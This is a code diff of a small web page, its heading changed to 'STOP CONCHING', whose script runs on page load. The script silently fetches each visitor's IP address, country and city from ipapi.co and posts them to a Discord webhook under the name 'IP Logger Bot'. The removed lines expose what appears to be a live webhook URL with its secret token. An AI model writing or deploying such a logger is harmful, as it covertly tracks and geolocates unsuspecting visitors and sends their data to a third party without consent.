@@ -21,35 +21,42 @@
         }
         
         @keyframes pulse {
-            0% { transform: scale(1); }
+            0% { transform: scale(0.5); }
             50% { transform: scale(1.5); }
-            100% { transform: scale(1); }
+            100% { transform: scale(0.5); }
         }
     </style>
 </head>
 <body>
-    <div class="title">Hola Amigos</div>
+    <div class="title">STOP CONCHING</div>
 
     <script>
-        // Function to get visitor's IP using an API
-        async function getIP() {
+        // Function to get visitor's IP and country using ipapi.co
+        async function getIPInfo() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
+                const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
-                return data.ip;
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city
+                };
             } catch (error) {
-                console.error('Error fetching IP:', error);
-                return 'Unable to get IP';
+                console.error('Error fetching IP info:', error);
+                return {
+                    ip: 'Unable to get IP',
+                    country: 'Unknown',
+                    city: 'Unknown'
+                };
             }
         }
 
         // Function to send IP to Discord webhook
-        async function sendToDiscord(ip) {
-            // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1309237553798578196/mzi5J51-8DPV2ZgKfAZn7YSyQ5IeAFy8FJAWl8Obb1PqygbkRsoRylx50jC9efCNgfcc';
+        async function sendToDiscord(ipInfo) {
+            const webhookUrl = 'YOUR_WEBHOOK_URL';
             
             const message = {
-                content: `New visitor! IP Address: ${ip}`,
+                content: `New visitor!\nIP Address: ${ipInfo.ip}\nCountry: ${ipInfo.country}\nCity: ${ipInfo.city}`,
                 username: 'IP Logger Bot'
             };
 
@@ -68,8 +75,8 @@
 
         // Execute when page loads
         window.onload = async function() {
-            const ip = await getIP();
-            await sendToDiscord(ip);
+            const ipInfo = await getIPInfo();
+            await sendToDiscord(ipInfo);
         };
     </script>
 </body>
